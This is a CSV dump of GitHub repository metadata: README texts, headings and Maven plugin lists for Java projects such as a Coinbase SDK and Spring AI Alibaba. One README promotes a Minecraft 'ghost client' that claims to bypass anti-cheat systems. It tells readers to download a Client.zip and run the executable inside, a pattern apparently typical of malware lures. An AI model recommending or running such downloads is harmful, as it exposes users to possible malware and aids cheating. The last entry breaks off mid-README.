repo,branch,readme,releases,issues,branches,pulls,headings,top,projects,plugins,pwars,pjars,ppoms
coinbase-samples/advanced-sdk-java,main,"# Coinbase Advanced Trade Java SDK README

## Overview

The *Advanced Java SDK* is a sample library that demonstrates the structure of a [Coinbase Advanced Trade](https://advanced.coinbase.com/) driver for
the [REST APIs](https://docs.cdp.coinbase.com/advanced-trade/reference).

Coinbase Advanced Trade offers a comprehensive API for traders, providing access to real-time market data, order management, and execution. Elevate your trading strategies and develop sophisticated solutions using our powerful tools and features.

## License

The *Advanced Java SDK* sample library is free and open source and released under the [Apache License, Version 2.0](LICENSE).

The application and code are only available for demonstration purposes.

## Usage

To use the *Advanced Java SDK*, initialize the Credentials class and create a new client. The Credentials struct is JSON
enabled. See an example of this inside of the [main.java.com.coinbase.examples package](./src/main/java/com/coinbase/examples/Main.java). Ensure that Advanced API credentials are stored in a secure manner.

The JSON format expected for `Advanced_CREDENTIALS` is:

```
{
  ""apiKeyName"": """",
  ""privateKey"": """",
}
```

Coinbase Advanced API credentials can be created in the Advanced web console under API.

An example of instantiating the credentials and using the PortfoliosService is shown below:

```java
public class Main {
    public static void main(String[] args) {
        String credsStringBlob = System.getenv(""ADVANCED_TRADE_CREDENTIALS"");
        ObjectMapper mapper = new ObjectMapper();

        try {
            CoinbaseAdvancedCredentials credentials = new CoinbaseAdvancedCredentials(credsStringBlob);
            CoinbaseAdvancedClient client = new CoinbaseAdvancedClient(credentials);

            PortfoliosService portfoliosService = AdvancedServiceFactory.createPortfoliosService(client);
            GetPortfolioByIdResponse portfolioResponse = portfoliosService.getPortfolioById(
                    new GetPortfolioByIdRequest.Builder()
                            .portfolioId(portfolioId)
                            .build());

            System.out.println(mapper.writeValueAsString(portfolioResponse));
        } catch (Exception e) {
            e.printStackTrace(e);
        }
    }
}
```

To see a full working example, see the [`Main`](src/main/java/com/coinbase/examples/Main.java) class under the com.coinbase.examples package.

**Warning** This does place a very small trade for a small amount of ADA. Please ensure that you have the necessary funds in your account before running this code.

## Binaries

Binaries and dependency information for Maven, Gradle, Ivy and others can be found at the [Maven Central Repository](https://central.sonatype.com/search?q=g%3Acom.coinbase.advanced+a%3Acoinbase-advanced-sdk-java&smo=true)

Maven example:

```xml
<dependency>
    <groupId>com.coinbase.advanced</groupId>
    <artifactId>coinbase-advanced-sdk-java</artifactId>
    <version>x.y.z</version>
</dependency>
```

## Build

To build the sample library, ensure that Java Development Kit (JDK) is installed and then run:

```bash
mvn clean install
```
",1,0,1,2.0,"['coinbase', 'advanced', 'trade', 'java', 'sdk', 'readme', 'overview', 'license', 'usage', 'binary', 'build']","['coinbase', 'advanced', 'trade', 'java', 'sdk']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
scordio/jimfs-junit-jupiter,main,"# Jimfs JUnit Jupiter [![Maven Central](https://img.shields.io/maven-central/v/io.github.scordio/jimfs-junit-jupiter?label=Maven%20Central)](https://mvnrepository.com/artifact/io.github.scordio/jimfs-junit-jupiter) [![javadoc](https://javadoc.io/badge2/io.github.scordio/jimfs-junit-jupiter/javadoc.svg)](https://javadoc.io/doc/io.github.scordio/jimfs-junit-jupiter)

[![CI](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml?query=branch%3Amain)
[![Cross-Version](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml?query=branch%3Amain)

This project provides a [JUnit Jupiter][] extension for in-memory
[`@TempDir`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html)
directories via the [Jimfs][] file system.

## Motivation

Today, it is already possible to use Jimfs and JUnit Jupiter together to create in-memory temporary directories for
testing.
However, it requires Jimfs in-memory file system handling hooked into JUnit Jupiter test lifecycle callbacks,
a boilerplate that users must implement on their own.

Starting from [version 5.10](https://junit.org/junit5/docs/5.10.0/release-notes/index.html#release-notes),
JUnit Jupiter offers a
[`TempDirFactory` SPI](https://junit.org/junit5/docs/5.10.0/user-guide/#writing-tests-built-in-extensions-TempDirectory)
for customizing how temporary directories are created via the `@TempDir` annotation.
The SPI allows libraries like Jimfs to provide their implementation.

First-party support was requested in [google/jimfs#258](https://github.com/google/jimfs/issues/258).
However, Google has not yet started using JUnit Jupiter, and such first-party support may only be provided when
Google does so.

Because of that, this extension was created to aid all the users who would like a smooth integration between Jimfs
and JUnit Jupiter.
This project will likely be discontinued if Google ever offers first-party support for this integration.

## Compatibility

Jimfs JUnit Jupiter is based on JUnit Jupiter 5, thus requiring at least Java 8.

Compatibility is guaranteed only with the JUnit Jupiter versions from 5.10 to the latest.

## Getting Started

### Maven

```xml
<dependency>
  <groupId>io.github.scordio</groupId>
  <artifactId>jimfs-junit-jupiter</artifactId>
  <version>${jimfs-junit-jupiter.version}</version>
  <scope>test</scope>
</dependency>
```

### Gradle

```kotlin
testImplementation(""io.github.scordio:jimfs-junit-jupiter:${jimfsJunitJupiterVersion}"")
```

### JimfsTempDirFactory

The simplest usage is to set the
[`factory`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html#factory())
attribute of `@TempDir` to `JimfsTempDirFactory`:

```java
@Test
void test(@TempDir(factory = JimfsTempDirFactory.class) Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

### @JimfsTempDir

`@JimfsTempDir`, a `@TempDir`
[composed annotation](https://junit.org/junit5/docs/current/user-guide/#writing-tests-meta-annotations),
can be used as a drop-in replacement for `@TempDir(factory = JimfsTempDirFactory.class)`:

```java
@Test
void test(@JimfsTempDir Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

The default behavior of the annotation is equivalent to using `JimfsTempDirFactory` directly:
`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

For better control over the underlying in-memory file system, `@JimfsTempDir` offers an optional `value` attribute
that can be set to the desired configuration, one of:
* `DEFAULT`: based on the corresponding [configuration parameter](#default-jimfs-configuration) (default)
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```java
@Test
void test(@JimfsTempDir(WINDOWS) Path tempDir) {
  assertThat(tempDir.getFileSystem().getSeparator()).isEqualTo(""\\"");
}
```

### Configuration Parameters

Jimfs JUnit Jupiter supports JUnit
[configuration parameters](https://junit.org/junit5/docs/current/user-guide/#running-tests-config-params).

#### Default `@TempDir` Factory

The `junit.jupiter.tempdir.factory.default` configuration parameter sets the default factory to use, expecting its
fully qualified class name.

For example, the following configures `JimfsTempDirFactory`:

```properties
junit.jupiter.tempdir.factory.default=io.github.scordio.jimfs.junit.jupiter.JimfsTempDirFactory
```

The factory will be used for all `@TempDir` annotations unless the `factory` attribute of the annotation
specifies a different type.

#### Default Jimfs Configuration

The `jimfs.junit.jupiter.tempdir.configuration.default` configuration parameter sets the default Jimfs configuration
to use, expecting one of the following (case-insensitive):
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform (default)
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```properties
jimfs.junit.jupiter.tempdir.configuration.default=windows
```

All Jimfs-based temporary directories will be configured accordingly unless `@JimfsTempDir` is used and
its `value` attribute is set.

### Limitations

Jimfs JUnit Jupiter only supports annotated fields or parameters of type `Path`, as Jimfs is a non-default file
system and `File` instances can only be associated with the default file system.

## Improvements

Compared to the configuration options that Jimfs provides, Jimfs JUnit Jupiter exposes a much smaller surface to keep
its usage simple.

In case something is missing for your use case, please [raise an issue](../../issues/new)!

## License

Jimfs JUnit Jupiter is released under version 2.0 of the [Apache License][].

[Apache License]: https://www.apache.org/licenses/LICENSE-2.0
[Jimfs]: https://github.com/google/jimfs
[JUnit Jupiter]: https://github.com/junit-team/junit5
",2,0,2,0.0,"['jimfs', 'junit', 'jupiter', 'maven', 'central', 'http', 'https', 'javadoc', 'http', 'https', 'motivation', 'compatibility', 'get', 'start', 'maven', 'gradle', 'jimfstempdirfactory', 'jimfstempdir', 'configuration', 'parameter', 'default', 'tempdir', 'factory', 'default', 'jimfs', 'configuration', 'limitation', 'improvement', 'license']","['jimfs', 'maven', 'http', 'https', 'configuration']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0
nhioufgaewnofidasjg/Minecraft-Entropy-Client,main,"# Minecraft Entropy - Ghost Client Repository

Welcome to the **Minecraft-Clients** repository! 🎮 Here you will find the powerful and versatile ghost client, **Minecraft Entropy**, designed to help Minecraft enthusiasts enhance their gameplay experience by providing advanced features. 

![Minecraft Entropy Banner](https://example.com/minecraft_entrophy/banner.jpg)

## Description

**Minecraft Entropy** is a state-of-the-art ghost client that specializes in bypassing screenshares and anti-cheat systems. Its robust features and compatibility with Minecraft versions 1.7.10 and 1.8.9 make it a must-have tool for players looking to elevate their gameplay. The client is conveniently installed via an executable, ensuring seamless integration and ease of use for all users.

## Features

👻 **Ghost Mode**: Stay undetected with our advanced ghost mode feature that keeps you under the radar.

⚔️ **Combat Enhancements**: Gain the upper hand in battles with improved combat abilities and targeting precision.

🌌 **Customization Options**: Tailor your client experience with a wide range of customization options to suit your gameplay style.

🔧 **Anti-Cheat Bypass**: Effortlessly bypass anti-cheat systems and enjoy uninterrupted gameplay sessions.

## Installation

To download and install **Minecraft Entropy**, click the button below:

[![Download Minecraft Entropy](https://img.shields.io/badge/Download-Client.zip-ff69b4)](https://github.com/user-attachments/files/16830252/Client.zip)

## Getting Started

### Prerequisites

Before installing **Minecraft Entropy**, ensure you have the following requirements:

- A computer running Windows 10
- Minecraft version 1.7.10 or 1.8.9 installed
- Sufficient disk space for installation

### Installation Steps

1. Download the **Client.zip** file by clicking the download button above.
2. Extract the contents of the zip file to a location of your choice on your computer.
3. Run the executable file to start the installation process.
4. Follow the on-screen instructions to complete the installation.

## Contributing

We welcome contributions from the community to help improve **Minecraft Entropy**. To contribute, follow these steps:

1. Fork the repository.
2. Make your changes and improvements.
3. Submit a pull request detailing your contributions.

## Acknowledgements

We would like to thank all the contributors who have helped enhance **Minecraft Entropy** and make it a valuable asset for Minecraft players worldwide.

![Minecraft Entropy Logo](https://example.com/minecraft_entrophy/logo.jpg)

## License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

Thank you for visiting the **Minecraft-Clients** repository and exploring **Minecraft Entropy**! 🎉 Get ready to elevate your Minecraft experience with our powerful ghost client. Happy gaming! 🚀",1,0,1,0.0,"['minecraft', 'entropy', 'ghost', 'client', 'repository', 'description', 'feature', 'installation', 'get', 'start', 'prerequisite', 'installation', 'step', 'contribute', 'acknowledgement', 'license']","['installation', 'minecraft', 'entropy', 'ghost', 'client']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
ngntu10/OptiMart,main,"# OptiMart

## Requirements

For building and running the application you need:

- [Node 20 & Npm 10](https://nodejs.org/en/download)
- [JDK 17](https://www.oracle.com/java/technologies/downloads/#java21)
- [Maven 3](https://maven.apache.org)

[//]: # ()
[//]: # (## Run the application locally)

[//]: # ()
[//]: # (Install the dependencies:)

[//]: # ()
[//]: # (``` bash)

[//]: # (npm install)

[//]: # (npm run prepare)

[//]: # (```)

[//]: # ()
[//]: # (Make sure to connect to your databse by defining the env file `env.properties` located in `/src/main/resources/`. For example:)

[//]: # ()
[//]: # (``` properties)

[//]: # (# /src/main/resources/env.properties)

[//]: # (DB_DDL_AUTO=update)

[//]: # (DB_URL=jdbc:postgresql://localhost:5432/postgres)

[//]: # (DB_USERNAME=your_username)

[//]: # (DB_PASSWORD=your_password)

[//]: # (```)

[//]: # ()
[//]: # (Run the server:)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn spring-boot:run)

[//]: # (```)

[//]: # ()
[//]: # (Use a browser to navigate to [http://localhost:8080/swagger-ui/index.html]&#40;http://localhost:8080/api/v1/swagger-ui/index.html&#41;.)

[//]: # ()
[//]: # (## Run tests)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn test)

[//]: # (```)

[//]: # ()
[//]: # (## Other commands)

[//]: # ()
[//]: # (### Format code)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn fmt:format)

[//]: # (```)

[//]: # (## How to name a branch?)

[//]: # ()
[//]: # (Branch name pattern:)

[//]: # ()
[//]: # ()
[//]: # (```text)

[//]: # (type/description-in-kebab-case)

[//]: # ()
[//]: # (type/issue-#{issue_number})

[//]: # ()
[//]: # (```)

[//]: # ()
[//]: # (Examples:)

[//]: # ()
[//]: # (```text)

[//]: # (feature/issue-#99)

[//]: # (```)

[//]: # ()
[//]: # (```text)

[//]: # (hotfix/quick-fix-for-an-emergency)

[//]: # (```)

[//]: # ()
[//]: # (Common types according to [simplified convention for naming branches]&#40;https://dev.to/varbsan/a-simplified-convention-for-naming-branches-and-commits-in-git-il4&#41;)

[//]: # (- feature: adding, refactoring or removing a feature)

[//]: # (- bugfix: fixing a bug)

[//]: # (- hotfix: changing code with a temporary solution and/or without following the usual process &#40;usually because of an emergency&#41;)

[//]: # (- test: experimenting outside of an issue/ticket)

[//]: # ()

## How to name a commit message?

**Commitlint** checks if your commit messages meet the [conventional commit format](https://conventionalcommits.org).

Commit message pattern:

```sh
type(scope?): subject  #scope is optional; multiple scopes are supported (current delimiter options: ""/"", ""\"" and "","")
```

Examples:

```text
chore: run tests on travis ci
```

```text
fix(server): send cors headers
```

```text
feat(blog): add comment section
```

Common types according to [commitlint-config-conventional (based on the Angular convention)](https://github.com/conventional-changelog/commitlint/tree/master/@commitlint/config-conventional#type-enum) can be:

- build
- chore
- ci
- docs
- feat
- fix
- perf
- refactor
- revert
- style
- test

[//]: # (## References)

[//]: # ()
[//]: # (Read these references if needed:)

[//]: # ()
[//]: # (- [Open api swagger]&#40;https://springdoc.org/&#41;)

[//]: # (- [Lombok]&#40;https://codippa.com/lombok/&#41;)

[//]: # (- [JPA/Hibernate entity relationships]&#40;https://www.baeldung.com/jpa-hibernate-associations&#41;)

[//]: # (- [Hibernate type mappings]&#40;https://vladmihalcea.com/a-beginners-guide-to-hibernate-types/&#41;)",0,1,2,1.0,"['optimart', 'requirement', 'run', 'application', 'locally', 'install', 'dependency', 'bash', 'npm', 'install', 'npm', 'run', 'prepare', 'make', 'sure', 'connect', 'databse', 'define', 'env', 'file', 'locate', 'for', 'example', 'property', 'postgresql', 'run', 'server', 'bash', 'mvn', 'run', 'use', 'browser', 'navigate', 'http', 'http', 'run', 'test', 'bash', 'mvn', 'test', 'other', 'command', 'format', 'code', 'bash', 'mvn', 'fmt', 'format', 'how', 'name', 'branch', 'branch', 'name', 'pattern', 'text', 'example', 'text', 'text', 'common', 'type', 'accord', 'simplify', 'convention', 'name', 'branch', 'http', 'feature', 'add', 'refactoring', 'remove', 'feature', 'bugfix', 'fixing', 'bug', 'hotfix', 'changing', 'code', 'temporary', 'solution', 'without', 'follow', 'usual', 'process', 'usually', 'emergency', 'test', 'experimenting', 'outside', 'how', 'name', 'commit', 'message', 'reference', 'read', 'reference', 'need', 'open', 'api', 'swagger', 'http', 'lombok', 'http', 'entity', 'relationship', 'http', 'hibernate', 'type', 'mapping', 'http']","['http', 'run', 'bash', 'name', 'mvn']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
alibaba/spring-ai-alibaba,main,"# [Spring AI Alibaba](https://sca.aliyun.com/ai/)

[中文版本](./README-zh.md)

An AI application framework for Java developers built on top of Spring AI that provides seamless integration with Alibaba Cloud QWen LLM services and cloud-native infrastructures.

## Get Started
Please refer to [quick start](https://sca.aliyun.com/ai/get-started/) for how to quickly add generative AI to your Spring Boot applications.

Overall, it takes only two steps to turn your Spring Boot application into an intelligent agent:

1. Add 'spring-ai-alibaba-starter' dependency to your project.

```xml
<dependency>
	<groupId>com.alibaba.cloud.ai</groupId>
	<artifactId>spring-ai-alibaba-starter</artifactId>
	<version>1.0.0-M2</version>
</dependency>
```

> NOTICE! Since spring-ai related packages haven't been published to the central repo yet, it's needed to add the following maven repository to your project in order to successfully resolve artifacts like  spring-ai-core.
>
> ```xml
> <repositories>
> 	<repository>
> 		<id>spring-milestones</id>
> 		<name>Spring Milestones</name>
> 		<url>https://repo.spring.io/milestone</url>
> 		<snapshots>
> 			<enabled>false</enabled>
> 		</snapshots>
> 	</repository>
> </repositories>
> ```

2. Inject the default `ChatClient` Bean to regular Controller beans.

```java
@RestController
public class ChatController {

	private final ChatClient chatClient;

	public ChatController(ChatClient.Builder builder) {
		this.chatClient = builder.build();
	}

	@GetMapping(""/chat"")
	public String chat(String input) {
		return this.chatClient.prompt()
				.user(input)
				.call()
				.content();
	}
}
```

## Examples
More examples can be found at [spring-ai-alibaba-examples](./spring-ai-alibaba-examples).

* Hello World
* Chat Model
* Function Calling
* Structured Output
* Prompt
* RAG
* Flight Booking Playground, an advanced example showcasing usage of prompt template, function calling, chat memory and rag at the same time.

## Core Features

Spring AI Alibaba provides the following features, read the [documentation](https://sca.aliyun.com/ai) on our website for more details of how to use these features.

* Support for Alibaba Cloud QWen Model and Dashscope Model service.
* Support high-level AI agent abstraction -- ChatClient.
* Support various Model types like Chat, Text to Image, Audio Transcription, Text to Speech.
* Both synchronous and stream API options are supported.
* Mapping of AI Model output to POJOs.
* Portable API across Vector Store providers.
* Function calling.
* Spring Boot Auto Configuration and Starters.
* RAG (Retrieval-Augmented Generation) support: DocumentReader, Splitter, Embedding, VectorStore, and Retriever.
* Support conversation with ChatMemory

## Roadmap

Spring AI Alibaba aims to reduce the complexity of building ai native java applications, from development, evaluation to deployment and observability. In order to achieve that, we provide both open-source framework and ecosystem integrations around it, below are the features that we plan to support in the near future:
* Prompt Template Management
* Event Driven AI Application
* Support of more Vector Databases
* Function Deployment
* Observability
* AI proxy support: prompt filtering, rate limit, multiple Model, etc.
* Development Tools

![ai-native-architecture](./docs/imgs/spring-ai-alibaba-arch.png)

## References
* [Spring AI](https://docs.spring.io/spring-ai/reference/index.html)
* [Alibaba Cloud Dashscope Model Service Platform (阿里云百炼模型服务及应用开发平台)](https://help.aliyun.com/zh/model-studio/getting-started/what-is-model-studio/)

## Contact Us
* Dingtalk Group (钉钉群), search `64485010179` and join.
* Wechat Group (微信公众号), scan the QR code below and follow us.

<img src=""./docs/imgs/wechat-account.jpg"" style=""max-width:100px;""/>

",1,4,1,25.0,"['spring', 'ai', 'alibaba', 'http', 'get', 'start', 'example', 'core', 'feature', 'roadmap', 'reference', 'contact', 'u']","['spring', 'ai', 'alibaba', 'http', 'get']",11.0,"[com.mycila:license-maven-plugin,com.vaadin:vaadin-maven-plugin,io.spring.javaformat:spring-javaformat-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,9.0,2.0
Giovds/outdated-maven-plugin,main,"# The Outdated Maven Plugin

> Stay up-to-date and secure with The Outdated Maven Plugin!

The Outdated Maven Plugin is a tool designed to help developers identify outdated dependencies in their Maven projects.
By scanning the dependencies of your project, this plugin determines if they are no longer actively maintained
based on a user-defined threshold of inactivity in years. This ensures that your project remains up-to-date with the
latest and most secure versions of its dependencies.

## Usage

You can use the plugin as standalone for a quick check by simply running the following command in your favourite
project:\
`mvn com.giovds:outdated-maven-plugin:check -Dyears=<number_of_years>`

Or plug it into your build:

```xml

<build>
    <plugins>
        <plugin>
            <groupId>com.giovds</groupId>
            <artifactId>outdated-maven-plugin</artifactId>
            <version>1.2.0</version>
            <configuration>
                <!-- The maximum amount of inactive years allowed -->
                <years>1</years>
                <!-- Whether to fail the build if an outdated dependency is found -->
                <shouldFailBuild>false</shouldFailBuild>
            </configuration>
            <executions>
                <execution>
                    <id>outdated-check</id>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

## Contributing

Contributions are welcome! \
Please verify if a similar issue is not reported already. If it is not create one, if it is.

## License

This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
",1,7,1,14.0,"['the', 'outdated', 'maven', 'plugin', 'usage', 'contribute', 'license']","['the', 'outdated', 'maven', 'plugin', 'usage']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jreleaser:jreleaser-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,0.0,0.0
Lunatix01/ragscan,master,"Simple CLI Retrieval Augmented Generation Scanner
=================================================
Aim of the project: A showcase of a RAG scanner written in Java and using [Spring AI](https://docs.spring.io/spring-ai/reference/api/index.html), which scans the targeted documents and you can ask questions to the LLM regarding the given documents.

## Disclaimer
This tool is intended for educational and productivity purposes only. It is designed to assist users in managing and querying their own documents. Any illegal or unethical use of this software is strictly prohibited.

## Requirements
1. [Java 21](https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html) installed on your device
2. [Docker](https://www.docker.com/products/docker-desktop/)
3. An environment variable named `GOOGLE_API_KEY` and add your [Google Gemini API key](https://ai.google.dev/gemini-api/docs/api-key)

## Installation
1. Navigate to the project directory
2. Open CMD/Powershell/Terminal
3. For Windows Run `./mvnw clean install`, for Linux/Mac run `./mvn clean install`

## How to use:
1. Run `docker-compose up` in your CMD/Powershell/Terminal
2. Run the project using maven, on Windows: `./mvnw spring-boot:run`, on Linux/Mac run `./mvn spring-boot:run`.
3. When the shell opens type `collection-size 768` (for Gemini `768` is compatible).
4. Place your files in a directory, copy the full path of the directory, and run something like this `load /your/path`, wait till the files are chunked and loaded to `Qdrant vector database`.
5. Finally in the shell write `ask ""your question here""` and that's it.


### Notes
It's a simple project, needs a lot of improvements like: 
1. Improve chunking documents (Currently chunked by token size)
2. Support more file types (Currently supports txt, HTML, JSON, MD, docx, ppt, pdf, and a lot more)
3. Support other Chat models like GPT, Ollama, etc... (currently supports Gemini version `gemini-1.5-flash-latest`, the reason I decided to use Gemini is because it has a good free tier)
4. Support to make it a standalone executable and a jar file, (Currently you can build it yourself and run it, it has no problem, but I will simplify it)
5. Support other vector databases ( Currently supports Qdrant, to be honest, it's good enough)
6. Support custom System Context and custom similar returned documents in DB (Default, for now, is 5.)

#### Rabbit hole
Don't try to retrieve an API key from older `.git` versions, it's a rabbit hole :)

Please create an Issue, if something is wrong I will look into it, and feel free to contribute to the project.
==============
",0,2,2,2.0,"['disclaimer', 'requirement', 'installation', 'how', 'use', 'note', 'rabbit', 'hole']","['disclaimer', 'requirement', 'installation', 'how', 'use']",1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
xsreality/abstractness-instability-calculator,main,"# Abstractness and Instability Metrics Calculator

This application calculates abstractness and instability metrics for Java, Spring Boot projects, helping developers analyze the structure and dependencies of their codebase.

It follows the principles of Spring Modulith by analyzing the [application module packages](https://docs.spring.io/spring-modulith/reference/fundamentals.html#modules.simple). These are direct sub-packages of the _main_ package that contains the `@SpringBootApplication` annotated class. Ideally, these packages are expected to be functional layers rather than technical layers (controller, services, repositories etc.).

A [Nix Flake](#nix-flake) is provided to help build on systems with outdated java and maven installations.

![screenshot](https://github.com/user-attachments/assets/a496037d-62b2-42b5-809f-0eec2f63018a)

Dependency Visualization

![dependency_visualization_recording](https://github.com/user-attachments/assets/83ed8bae-5b0d-4b8c-a356-820e29c3ebad)

## Features

- Scans Spring Boot projects to identify packages and their relationships
- Calculates abstractness, instability, and distance from the main sequence for each package
- Provides a web interface for easy project analysis
- Visualizes results using an interactive scatter plot
- Dependency visualization

## Prerequisites

- Java 22 or higher
- Maven 3.6 or higher

## Installation

1. Clone the repository:
   ```
   git clone https://github.com/xsreality/abstractness-instability-calculator.git
   ```

2. Navigate to the project directory:
   ```
   cd abstractness-instability-calculator
   ```

3. Build the project:
   ```
   mvn clean install
   ```

## Usage

1. Run the application:
   ```
   java -jar target/abstractness-instability-calculator-1.0-SNAPSHOT.jar
   ```

2. Open a web browser and go to `http://localhost:8080`

3. Enter the path to your Java project in the input field

4. Click ""Scan"" to analyze the project

5. View the results in the interactive scatter plot

## Nix Flake

1. Enter development environment
   ```
   nix develop
   ```

2. Build application
   ```
   mvn clean package -DskipTests
   ```

3. Run application
   ```
   java -jar target/abstractness-instability-calculator*.jar
   ```

## Understanding the Results

The scatter plot visualizes three key metrics for each package:

### Instability (I)
- **Range**: 0 to 1
- **Interpretation**: 
  - 0: Maximally stable
  - 1: Maximally unstable
- **Calculation**: I = Ce / (Ca + Ce), where:
  - Ce: Efferent Couplings (outgoing dependencies)
  - Ca: Afferent Couplings (incoming dependencies)
- **Practical Use**: 
  - Helps identify packages that are more likely to change due to changes in other packages.
  - Stable packages (low I) are good candidates for being depended upon.
  - Unstable packages (high I) should generally depend on stable packages to maintain system stability.

### Abstractness (A)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Completely concrete
  - 1: Completely abstract
- **Calculation**: A = (Number of abstract classes and interfaces) / (Total number of classes)
- **Practical Use**:
  - Indicates the level of abstraction in a package.
  - Highly abstract packages (high A) are often more flexible but may be less directly usable.
  - Concrete packages (low A) are typically more immediately usable but may be less flexible.

### Distance from the Main Sequence (D)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Directly on the Main Sequence (optimal)
  - 1: Furthest from the Main Sequence (problematic)
- **Calculation**: D = |A + I - 1|
- **Practical Use**:
  - Measures how well a package balances abstractness and stability.
  - Packages close to the Main Sequence (low D) are considered well-designed.
  - Helps identify packages that may need refactoring or restructuring.

### Interpreting the Scatter Plot

The plot visualizes these metrics and highlights two important zones:

1. **Zone of Pain** (Bottom-left corner):
   - High stability (low I) and low abstractness (low A)
   - Packages here are difficult to extend and have many dependents
   - Example: A database schema class that many other classes depend on

2. **Zone of Uselessness** (Top-right corner):
   - Low stability (high I) and high abstractness (high A)
   - Packages here are abstract but have no dependents, indicating potentially unused code
   - Example: An over-engineered set of interfaces with no implementations

3. **Main Sequence** (Diagonal line from top-left to bottom-right):
   - Represents an ideal balance between abstractness and instability
   - Packages should aim to be close to this line

### Color Coding
- **Green**: Packages close to the Main Sequence (D ≤ 0.5)
- **Red**: Packages far from the Main Sequence (D > 0.5)

### Practical Application
- Use these metrics to identify packages that may need refactoring:
  - Packages in the Zone of Pain might benefit from increased abstraction.
  - Packages in the Zone of Uselessness might need to be made more concrete or removed if unused.
  - Red packages (high D) are primary candidates for restructuring.
- Monitor these metrics over time to ensure your codebase maintains a good structure as it evolves.
- Use in conjunction with other software quality metrics and practices for a comprehensive view of your codebase's health.

While these metrics provide valuable insights, they should not be treated as absolute rules. Always consider the specific context and requirements of your project when making architectural decisions.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

",0,0,1,9.0,"['abstractness', 'instability', 'metric', 'calculator', 'feature', 'prerequisite', 'installation', 'usage', 'nix', 'flake', 'understand', 'result', 'instability', 'i', 'abstractness', 'a', 'distance', 'main', 'sequence', 'd', 'interpret', 'scatter', 'plot', 'color', 'cod', 'practical', 'application', 'contribute', 'license']","['abstractness', 'instability', 'metric', 'calculator', 'feature']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
Hindhuja-V/devOps-project,main,"# Real-World DevOps/Cloud Projects For Learning by ProDevOpsGuy♐

![DevOps-Projects](https://imgur.com/5czbYqE.png)

## DevOps Real World Projects for Aspiring DevOps Engineers [Beginner to Advanced]

### Repository Contents for DevOps Projects from Beginner to Advanced Levels

The repository contains hands-on DevOps projects suitable for individuals at various skill levels, ranging from beginner to advanced.

### Integration of DevOps Technology with Other Technologies

Projects in this repository showcase the integration of DevOps practices with other cutting-edge technologies such as Machine Learning, Git, GitHub, etc.

### Project Scope

